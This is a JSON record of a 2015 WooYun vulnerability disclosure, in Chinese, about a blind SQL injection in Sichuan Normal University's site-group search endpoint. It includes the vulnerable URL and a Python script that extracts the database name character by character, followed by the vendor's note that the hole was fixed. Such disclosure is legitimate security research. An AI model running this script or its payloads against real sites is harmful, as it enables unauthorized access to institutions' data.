{"id": 30237, "wybug_id": "wooyun-2015-0117085", "wybug_title": "四川师范大学站群系统sql注入", "wybug_corp": "sicnu.edu.cn", "wybug_author": "有归于无", "wybug_date": "2015-05-30 10:26", "wybug_open_date": "2015-06-02 09:45", "wybug_type": "SQL注射漏洞", "wybug_level": "高", "wybug_rank_0": "12", "wybug_status": "厂商已经修复", "wybug_from": "http://www.wooyun.org", "wybug_tags": "", "wybug_detail": "漏洞详情 披露状态：   \t\t\t\t\t\t\t\t\t2015-05-30：\t细节已通知厂商并且等待厂商处理中\t\t\t\t\t\t\t\t\t2015-06-01：\t厂商已经确认，细节仅向厂商公开\t\t\t\t\t\t\t\t\t2015-06-02：\t厂商已经修复漏洞并主动公开，细节向公众公开  简要描述： 站群系统，搜索处盲注。 详细说明：  36个站：\n\n这个地方有问题：\nhttp://card.sicnu.edu.cn/_wx/_wx_home_news.aspx?fid=&kw=\n实际请求地址：\nhttp://card.sicnu.edu.cn/_wx/_wx_home_news_ajax.ashx?action=GetHtml&fid=&kw=1\n不知道怎么写的sql语句，也不知道怎么过滤的，用sqlmap跑不出来，自己写了个验证脚本。\n# -*- coding: utf-8 -*-import urllib2import sysreload(sys)sys.setdefaultencoding('utf-8')def get_current_database(url):    print '[*]testing current database lenth...'    for database_len in range(1,50): #原谅我直接认为它数据库名长度小于50        req_url=url+\"%'+and+len(db_name())>\"+str(database_len)+\"--+\"        req=urllib2.urlopen(req_url)        # print req.read()        lenth=len(req.read())        if lenth < 100: #手工查看它无回显时页面内容就小于100            break    print '[*]database len:'+str(database_len)    print '[*]testing current datase...'    current_db=''    for i in range(1,database_len+1):        for num in range(0,128):            req_url=url+\"%'+and+ascii(substring(db_name(),\"+str(i)+\",1))>\"+str(num)+\"--+\"            content_lenth=len(urllib2.urlopen(req_url).read())            if content_lenth<100:                print chr(num)                current_db+=chr(num)                break    return current_dbif __name__ == '__main__':    current_db=get_current_database(sys.argv[1])    print '[*]current database:'+current_db\n结果：\n\n这样证明应该足够了吧，就不深入了哈。。。   漏洞证明：  \n\n   修复方案：  过滤   版权声明：转载请注明来源 有归于无@乌云\n ", "wybug_reply": "漏洞回应  厂商回应： 危害等级：高 漏洞Rank：10  确认时间：2015-06-01 09:03 厂商回复： 处理修复中... 最新状态： 2015-06-02：漏洞已修复，感谢有归于无对四川师范大学信息安全建设做出的贡献。  ", "replys": "漏洞评价：\n评论\n     2015-06-04 14:54 |    \t\tssssss \t\t\t( 路人 |\t\t\t        Rank:0 漏洞数:1        | 一心成为伟大白帽的梦-.-)\t\t \n  挺不错的。。    \n     2015-06-15 16:37 |    \t\tsf0l \t\t\t( 路人 |\t\t\t        Rank:17 漏洞数:2        | 2'xx00)\t\t \n  @龙舟 :)    \n     2015-06-15 16:42 |    \t\t有归于无 \t\t\t( 实习白帽子  |\t\t\t        Rank:84 漏洞数:15        | 有归于无)\t\t \n  @sf0l 你谁啊    \n  \n\n\n", "wybug_level_fromcorp": "高", "wybug_rank_fromcorp": 10, "Ranks": null}